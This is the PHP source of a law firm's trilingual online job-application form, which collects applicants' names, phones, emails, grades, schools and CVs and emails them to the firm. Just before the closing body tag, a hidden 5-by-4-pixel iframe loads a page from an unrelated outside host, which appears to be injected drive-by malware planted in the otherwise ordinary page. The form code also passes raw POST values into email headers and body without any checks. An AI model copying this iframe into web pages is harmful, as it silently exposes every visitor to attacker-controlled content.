<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}

	global $prefijo_socio,$socio;
	
	$leyenda['area']['esp']='Area';
	$leyenda['area']['ing']='Area';
	$leyenda['area']['por']='Area';

	$leyenda['nombre']['esp']='Nombre';
	$leyenda['nombre']['ing']='Name';
	$leyenda['nombre']['por']='Name';

	$leyenda['telefono']['esp']='Teléfono';
	$leyenda['telefono']['ing']='Phone';
	$leyenda['telefono']['por']='Phone';

	$leyenda['email']['esp']='E-mail';
	$leyenda['email']['ing']='E-mail';
	$leyenda['email']['por']='E-mail';

	$leyenda['promedio']['esp']='Promedio Académico';
	$leyenda['promedio']['ing']='Degree Average';
	$leyenda['promedio']['por']='Degree Average';

	$leyenda['colegio']['esp']='Escuela';
	$leyenda['colegio']['ing']='School';
	$leyenda['colegio']['por']='Shool';
	
	$areas[]['esp']='Abogados';
	$areas[]['esp']='Traductores';
	$areas[]['esp']='Staff';

	$areas[]['ing']='Attorneys';
	$areas[]['ing']='Translation Bureau';
	$areas[]['ing']='Staff';
	
	$areas[]['por']='Attorneys';
	$areas[]['por']='Translation Bureau';
	$areas[]['por']='Staff';
	
	$sel['esp'] = 'Indique ';
	$sel['ing'] = 'Indicate ';
	$sel['por']  = 'Indicate ';
	
	$mail['mdt']='scm@mdtmdt.com';
	$mail['sou']='scm@mdtmdt.com';
	$mail['alv']='scm@mdtmdt.com';

	foreach($areas as $a => $b){
		if($b[$lng] != ''){
			$are[]=$b[$lng];
		}
	}
	
	if($accion=='enviar'){
	
		$msg=date('d-m-Y')."\r \n";
		$msg.="\r\n";
		$msg	.=$leyenda['area'][$lng]." = ".$_POST['area']."\r\n";
		$msg.=$leyenda['nombre'][$lng]." = ".$_POST['nombre']."\r\n";
		$msg.=$leyenda['telefono'][$lng]." = ".$_POST['telefono']."\r\n";
		$msg.=$leyenda['email'][$lng]." = ".$_POST['email']."\r\n";
		$msg.=$leyenda['promedio'][$lng]." = ".$_POST['promedio']."\r\n";
		$msg.=$leyenda['colegio'][$lng]." = ".$_POST['colegio']."\r\n";
		$msg.="Curriculum = ".nl2br($_POST['Curriculum'])."\r\n\r\n";

		$msgh=date('d-m-Y')."<br>";
		$msgh.="&nbsp;<br>";
		$msgh.=$leyenda['area'][$lng]." = ".$_POST['area']."<br>";
		$msgh.=$leyenda['nombre'][$lng]." = ".$_POST['nombre']."<br>";
		$msgh.=$leyenda['telefono'][$lng]." = ".$_POST['telefono']."<br>";
		$msgh.=$leyenda['email'][$lng]." = ".$_POST['email']."<br>";
		$msgh.=$leyenda['promedio'][$lng]." = ".$_POST['promedio']."<br>";
		$msgh.=$leyenda['colegio'][$lng]." = ".$_POST['colegio']."<br>";
		$msgh.="Curriculum = ".nl2br($_POST['curriculum'])."<br>";

		email::send(
		array($_POST['nombre'], $_POST['email']),//from
				array($mail[$socio] => $mail[$socio]),//to
				" Curriculum ",//subject
				$msgh,//html
				NULL,//attach_related
				NULL,//attach_mixed
				$msg,//text
				NULL,//cc
				NULL,//bcc
				CFG_mailRemitente,//reply_to
				"\n",//nl
				false,//debug
				CFG_returnPath
			);

		?>

			<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">

			<table border=0 cellpadding='1' cellspacing=1 width="100%">
			  <tr>
				<td class="divisor"  height="19"><small>&nbsp;</small></a></td>
			  </tr>
				<tr><td class="titulocv">Su aplicación ha sido recibida correctamente, gracias!</td></tr>
			</table>


		<?

	}
	else{
	


?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script>
function enviar(){
	f=document.form;

	if(f.area.value=='0'){      alert('<?=$sel[$lng]?> <?=$leyenda['area'][$lng]?>');return;}
	if(f.nombre.value==''){   alert('<?=$sel[$lng]?> <?=$leyenda['nombre'][$lng]?>');return;}
	if(f.telefono.value==''){  alert('<?=$sel[$lng]?> <?=$leyenda['telefono'][$lng]?>');return;}
	if(f.email.value==''){      alert('<?=$sel[$lng]?> <?=$leyenda['email'][$lng]?>');return;}
	if(f.promedio.value==''){ alert('<?=$sel[$lng]?> <?=$leyenda['promedio'][$lng]?>');return;}
	if(f.colegio.value==''){    alert('<?=$sel[$lng]?> <?=$leyenda['colegio'][$lng]?>');return;}

	document.form.accion.value='enviar';
	document.form.submit();
	
}
</script>
</head>
<html>

<body>
<table border=0 cellpadding='0' cellspacing=0 width="100%">
  <tr valign="top">
    <td class="espacio"  height="19" align="right"><span class="titulos">On Line Applications</a></span></td>
  </tr>
</table>

<table width="351" border="0" cellpadding='0' cellspacing=0>
<form name="form" action="<?=$PHP_SELF?>" method="post">
<input type="hidden" name="accion">
  <tr>
    <td class="textocv" height="8">&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td class="textocv" height="8"><div align="right">Area</div></td>
    <td>&nbsp;</td>
    <td><select name="area" class="textocv">
	<option value="0">----------</option>
	<?
	foreach($are as $a => $b){
	?>
      <option value="<?=$b?>"><?=$b?></option>
	<?
	}
	?>
    </select></td>
  </tr>
  <tr>
    <td class="textocv" height="8">&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td width="73" class="textocv" height="8"><div align="right"><?=$leyenda['nombre'][$lng]?></div></td>
    <td width="20">&nbsp;</td>
    <td width="258"><input name="nombre" type="text" class="textocv" id="nombre6" size="50"></td>
  </tr>
  <tr>
    <td class="textocv"><div align="right"><?=$leyenda['telefono'][$lng]?></div></td>
    <td>&nbsp;</td>
    <td><input name="telefono" type="text" class="textocv" id="telefono2" size="50"></td>
  </tr>
  <tr>
    <td class="textocv"><div align="right"><?=$leyenda['email'][$lng]?></div></td>
    <td>&nbsp;</td>
    <td><input name="email" type="text" class="titulocv" id="email" size="50"></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td class="textocv"><div align="right"><?=$leyenda['promedio'][$lng]?></div></td>
    <td>&nbsp;</td>
    <td><input name="promedio" type="text" class="textocv" id="promedio" size="50"></td>
  </tr>
  <tr>
    <td class="textocv"><div align="right"><?=$leyenda['colegio'][$lng]?></div></td>
    <td>&nbsp;</td>
    <td><input name="colegio" type="text" class="textocv" id="colegio" size="50"></td>
  </tr>
  <tr>
    <td colspan="3">&nbsp;</td>
    </tr>
  <tr>
    <td class="textocv"><div align="right">Curriculum</div></td>
    <td>&nbsp;</td>
    <td>
      <textarea name="curriculum" cols="58" rows="6" class="titulocv"></textarea>    </td>
  </tr>
  <tr>
    <td colspan="3">
      <div align="right">      </div></td>
    </tr>
  <tr>
    <td>&nbsp;</td>
    <td><br>      </td>
    <td><input name="Button" type="button" class="botones" value="Enviar" onClick="enviar()"></td>
  </tr>
  </form>
</table>
<?
}
?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
